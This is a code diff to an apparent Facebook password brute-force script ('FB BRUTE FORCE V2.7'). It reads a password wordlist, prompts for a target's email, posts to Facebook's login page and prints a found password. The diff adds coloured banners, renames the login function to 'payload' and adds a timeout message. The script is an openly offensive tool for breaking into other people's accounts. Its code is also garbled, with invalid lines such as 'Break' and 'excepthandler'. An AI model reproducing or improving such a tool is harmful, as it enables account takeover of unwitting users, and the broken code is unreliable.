@@ -1,3 +1,4 @@
+from http.client import REQUEST_TIMEOUT
 import sys 
 import os
 import time
@@ -30,15 +31,15 @@ B=443333
 R=433333
 Y=333333
 
-print(' ___   ___     ___   ___   _   _   _____   ___    __   __  ___   ___     ___       ____ ')
-print('| __| | _ )   | _ ) | _ \ | | | | |_   _| | __|   \ \ / / | __| | _ \   |_  )     |__  |')
-print('| _|  | _ \   | _ \ |   / | |_| |   | |   | _|     \ V /  | _|  |   /    / /   _    / /') 
-print('|_|   |___/   |___/ |_|_\  \___/    |_|   |___|     \_/   |___| |_|_\   /___| (_)  /_/')
+print('\033[1;32m ___   ___     ___   ___   _   _   _____   ___    __   __  ___   ___     ___       ____')
+print('\033[1;32m| __| | _ )   | _ ) | _ \ | | | | |_   _| | __|   \ \ / / | __| | _ \   |_  )     |__  |')
+print('\033[1;32m| _|  | _ \   | _ \ |   / | |_| |   | |   | _|     \ V /  | _|  |   /    / /   _    / /') 
+print('\033[1;32m|_|   |___/   |___/ |_|_\  \___/    |_|   |___|     \_/   |___| |_|_\   /___| (_)  /_/')
 print('FOLLOW US ON FB:www.facebook.com/cyberhacks6')
 webbrowser.open('www.facebook.com/cyberhacks6')
 file=open('password.txt','r')
 
-def login( email, password):
+def payload( email, password):
     urlopen = 'https://www.facebook.com/login.php'
     header = {'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36'}
 email = input("enter email of target:")
@@ -65,6 +66,8 @@ print("your password is : ",password)
 Break
 
 excepthandler
+REQUEST_TIMEOUT
+print('connection timeout')
 timeout(5)
 sys.exit
 
